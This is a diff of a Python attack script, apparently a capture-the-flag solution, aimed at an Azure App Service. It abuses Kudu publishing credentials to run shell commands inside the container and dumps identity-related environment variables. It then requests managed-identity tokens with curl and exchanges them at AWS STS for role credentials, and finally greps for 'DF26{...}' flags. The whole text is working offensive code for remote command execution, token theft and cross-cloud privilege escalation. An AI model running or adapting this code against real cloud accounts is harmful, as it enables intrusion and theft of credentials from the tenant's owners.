@@ -116,11 +116,14 @@ if not am:
 SITEBASE=f"{B}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Web/sites/{site}"
 MIBASE=f"{B}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.ManagedIdentity/userAssignedIdentities/{mi}"
 
-# ID resource của MI (cần cho Kudu khi xin token user-assigned)
-mid=api(MIBASE+"?api-version=2023-01-31",tok=am)
-MI_RESID=mid.get("id","") if isinstance(mid,dict) else ""
-MI_CLIENTID=(mid.get("properties") or {}).get("clientId","") if isinstance(mid,dict) else ""
-print("[*] MI resid:",MI_RESID,"clientId:",MI_CLIENTID)
+# MI resource-id lấy từ identity block của site (reporting-service có sites/read)
+site_obj=api(SITEBASE+"?api-version=2022-03-01",tok=am)
+MI_RESID=""
+if isinstance(site_obj,dict):
+    ids=((site_obj.get("identity") or {}).get("userAssignedIdentities") or {})
+    if ids: MI_RESID=list(ids.keys())[0]
+print("[*] MI resid:",MI_RESID)
+# FIC của MI (thử đọc trực tiếp; nếu denied vẫn tiếp tục)
 fx=api(MIBASE+"/federatedIdentityCredentials?api-version=2023-01-31",tok=am)
 AWS_FIC=[]
 if isinstance(fx,dict):
@@ -128,6 +131,7 @@ if isinstance(fx,dict):
         p=c.get("properties",c)
         print("[*] MI-FIC:",c.get("name"),"iss=",p.get("issuer"),"sub=",p.get("subject"),"aud=",p.get("audiences"))
         AWS_FIC.append(p)
+    if "error" in fx: print("[*] MI-FIC read:",fx["error"][:120])
 
 pc=api(SITEBASE+"/config/publishingcredentials/list?api-version=2022-03-01","POST",tok=am,body={})
 if "error" in pc: print("[!] publishingcredentials:",pc);
@@ -143,20 +147,25 @@ else:
         d=json.dumps(body).encode() if body is not None else None
         r=urllib.request.Request(f"https://{site}.scm.azurewebsites.net{path}",d,h,method=method)
         try:
-            with urllib.request.urlopen(r,timeout=90) as f: return f.read().decode(errors="replace")
+            with urllib.request.urlopen(r,timeout=90) as f: return f.status,f.read().decode(errors="replace")
         except Exception as e:
-            try: return "ERR "+e.read().decode(errors="replace")[:300]
-            except Exception: return "ERR "+str(e)[:150]
+            try: return getattr(e,'code',0),e.read().decode(errors="replace")
+            except Exception: return 0,str(e)
 
-    # /api/command chạy lệnh trong container
+    sc,st=kudu("/api/settings"); print("=== kudu /api/settings",sc,"===",st[:160])
+    sc,ci=kudu("/api/command","POST",{"command":"id && uname -a","dir":"/home"})
+    print("=== kudu /api/command",sc,"===",ci[:400])
+
     def run(cmd):
-        out=kudu("/api/command","POST",{"command":cmd,"dir":"/home"})
-        try: return json.loads(out).get("Output","")+json.loads(out).get("Error","")
+        c,out=kudu("/api/command","POST",{"command":cmd,"dir":"/home"})
+        try:
+            j=json.loads(out); return (j.get("Output","") or "")+(j.get("Error","") or "")
         except Exception: return out
+    def runsh(cmd): return run("bash -lc "+json.dumps(cmd))
 
     q=lambda s: urllib.parse.quote(s, safe="")
-    print("=== env trong app ==="); print(run("printenv | grep -iE 'IDENTITY|MSI|AWS|ARN|ROLE' | sort")[:1200])
-    rolearn=run("printenv AWS_ROLE_ARN").strip()
+    print("=== env trong app ==="); print(runsh("printenv | grep -iE 'IDENTITY|MSI|AWS|ARN|ROLE' | sort")[:1500])
+    rolearn=runsh("printenv AWS_ROLE_ARN").strip()
     print("   AWS_ROLE_ARN env =", rolearn[:160])
 
     # xin token MI cho các audience AWS khả dĩ (lấy đúng từ MI-FIC nếu có)
@@ -167,7 +176,7 @@ else:
         print("=== MI token (resource="+aud+") ===")
         c=('curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?resource='
            + q(aud) + '&api-version=2019-08-01&mi_res_id=' + q(MI_RESID) + '"')
-        o=run(c); print(o[:500])
+        o=runsh(c); print(o[:500])
         m=re.search(r'"access_token":"([^"]+)"', o)
         if not m: continue
         tok=m.group(1)
@@ -175,12 +184,12 @@ else:
             print("=== AWS AssumeRoleWithWebIdentity (aud="+aud+") ===")
             url=('https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn='
                  + q(rolearn) + '&RoleSessionName=s&WebIdentityToken=' + q(tok))
-            aws=run('curl -s -H "Accept: application/json" "' + url + '"')
+            aws=runsh('curl -s -H "Accept: application/json" "' + url + '"')
             print(aws[:900])
             if FLAG.findall(aws): print("*** FLAG", FLAG.findall(aws))
 
     print("=== grep flag trong wwwroot ===")
-    print(run("grep -rIoE 'DF26[{][^}]*[}]' /home/site/wwwroot /home 2>/dev/null | head")[:400])
+    print(runsh("grep -rIoE 'DF26[{][^}]*[}]' /home/site/wwwroot /home 2>/dev/null | head")[:400])
 
 cleanup()
 PY
